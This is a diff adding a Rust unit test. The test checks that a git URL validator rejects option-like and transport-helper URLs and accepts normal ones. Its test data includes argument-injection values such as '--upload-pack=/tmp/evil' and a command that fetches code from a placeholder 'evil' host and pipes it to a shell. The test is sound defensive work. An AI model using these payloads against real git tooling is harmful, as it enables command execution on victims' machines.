@@ -1599,3 +1599,32 @@ fn scaffold_applies_upstream_patches_without_shared_remote() {
     assert!(sha.is_some(), "scaffold must produce a commit");
     std::fs::remove_dir_all(&dir).ok();
 }
+
+/// A URL that starts with `-` is not a URL, it is an option: `git clone
+/// --mirror <url> <dir>` would read `--upload-pack=/path/x` and run that
+/// program. `helper::<addr>` is the same class one level down (`ext::`, `fd::`
+/// run a transport helper). Both are refused before git is spawned.
+#[test]
+fn a_git_url_that_looks_like_an_option_or_a_transport_helper_is_refused() {
+    for bad in [
+        "--upload-pack=/tmp/evil",
+        "-c core.pager=evil",
+        "ext::sh -c 'curl evil|sh'",
+        "fd::7",
+        "ssh::host/path",
+    ] {
+        assert!(
+            validate_git_url(bad).is_err(),
+            "{bad:?} must be refused before git sees it"
+        );
+    }
+    for ok in [
+        "https://github.com/acme/demo.git",
+        "ssh://git@github.com/acme/demo.git",
+        "git@github.com:acme/demo.git",
+        "file:///srv/repos/demo.git",
+        "D:/repos/demo",
+    ] {
+        assert!(validate_git_url(ok).is_ok(), "{ok:?} must be accepted");
+    }
+}
